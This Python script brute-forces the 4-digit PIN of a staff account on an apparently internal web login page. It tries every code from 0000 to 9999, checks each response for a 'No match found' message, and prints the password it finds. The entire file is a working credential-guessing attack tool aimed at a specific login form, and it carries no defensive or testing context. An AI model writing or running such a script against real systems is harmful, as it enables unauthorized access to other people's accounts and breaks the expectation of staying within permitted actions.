import requests
from bs4 import BeautifulSoup
import argparse

class Colors:
    HEADER = '\033[95m'  # Purple
    OKBLUE = '\033[94m'  # Blue
    OKCYAN = '\033[96m'  # Cyan
    OKGREEN = '\033[92m'  # Green
    WARNING = '\033[93m'  # Yellow
    FAIL = '\033[91m'  # Red
    ENDC = '\033[0m'    # Reset to default
    BOLD = '\033[1m'    # Bold text
    UNDERLINE = '\033[4m'  # Underline text

def print_colored(message, color):
    print(f"{color}{message}{Colors.ENDC}")

def login(session, login_url, empno, password):
    payload = {
        "mempno": empno,
        "mpass": password,
        "mlevel": 2,
    }
    response = session.post(login_url, data=payload)
    
    if response.status_code == 200:
        # Parse the response HTML to check if there is a "No match found" message
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Strip leading/trailing whitespace and check if "No match found" exists
        error_message = soup.find(string=lambda text: text and "No match found" in text.strip())
        
        if error_message:
            return False  # Incorrect password
        else:
            return True  # Successful login
    return False

def find_password(session, login_url, empno):
    # Try all passwords from 0000 to 9999
    for password in range(10000):
        password_str = str(password).zfill(4)  # Pad to ensure it's a 4-digit number
        if login(session, login_url, empno, password_str):
            # print_colored(f"Success! Found the correct password: {password_str}", Colors.OKGREEN)
            # print_colored(f"{password_str}", Colors.OKGREEN)
            return password_str
    print_colored("Failed to find the correct password.", Colors.FAIL)
    return None

def main():
    # Set up command-line arguments
    parser = argparse.ArgumentParser(description="Try to log in with different passwords.")
    parser.add_argument("staffNo", type=str, help="The staff number (e.g., memno)")

    args = parser.parse_args()

    staffNo = args.staffNo

    login_url = "http://piano/blogin.asp"
    session = requests.Session()

    # Attempt to find the correct password
    password = find_password(session, login_url, staffNo)
    if password:
        print(f"{password}")
    else:
        print("No valid password found.")

if __name__ == "__main__":
    main()
